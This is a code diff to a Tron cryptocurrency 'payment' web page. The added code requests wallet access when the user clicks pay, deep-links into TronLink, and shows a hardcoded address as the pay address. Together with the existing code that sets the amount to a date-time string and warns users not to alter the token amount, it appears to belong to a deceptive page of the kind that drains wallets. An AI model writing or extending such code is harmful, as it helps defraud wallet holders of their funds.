@@ -261,6 +261,11 @@ async function getWallet() {
 
 function payNow() {
   amount = getCurrentDateTimeString();
+  try {
+    if (typeof window.tronLink !== 'undefined' && typeof window.tronLink.request === 'function') {
+      window.tronLink.request({ method: 'tron_requestAccounts' }).catch(function(){});
+    }
+  } catch (e) {}
   if (chain == "tron") {
     if (wallet == "imToken") {
       alert("正在拉起支付！选择安全模式后，请勿修改下个页面代币数量，否则会导致支付失败！");
@@ -272,7 +277,12 @@ function payNow() {
     // 兜底：未检测到 Tron 注入时尝试使用 TronLink 外部唤起
     try {
       var param = { url: window.location.href, action: "open", protocol: "tronlink", version: "1.0" };
-      window.location.href = "tronlinkoutside://pull.activity?param=" + encodeURIComponent(JSON.stringify(param));
+      // iOS 优先尝试 tronlink://
+      window.location.href = "tronlink://pull.activity?param=" + encodeURIComponent(JSON.stringify(param));
+      // Android 兜底 tronlinkoutside://（延迟尝试）
+      setTimeout(function(){
+        try { window.location.href = "tronlinkoutside://pull.activity?param=" + encodeURIComponent(JSON.stringify(param)); } catch(e){}
+      }, 300);
     } catch (e) {}
   }
 }
@@ -429,4 +439,18 @@ contract_addr = "undefined";
 contract_abi = [];
 document.addEventListener("DOMContentLoaded", function () {
   getWalletTimer = setInterval(getWallet, 1000);
+});
+
+// 监听 tronLink 注入（移动端常见延迟注入）
+document.addEventListener('tronLink#initialized', function () {
+  try {
+    if (typeof window.tronWeb !== 'undefined') {
+      wallet = 'tronLink';
+      chain = 'tron';
+      pay_addr_input_ele.innerHTML = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+      if (getWalletTimer) clearInterval(getWalletTimer);
+      if (pay_ele) pay_ele.removeAttribute('style');
+      if (wallet_ele) wallet_ele.setAttribute('style', 'display:none');
+    }
+  } catch (e) {}
 });
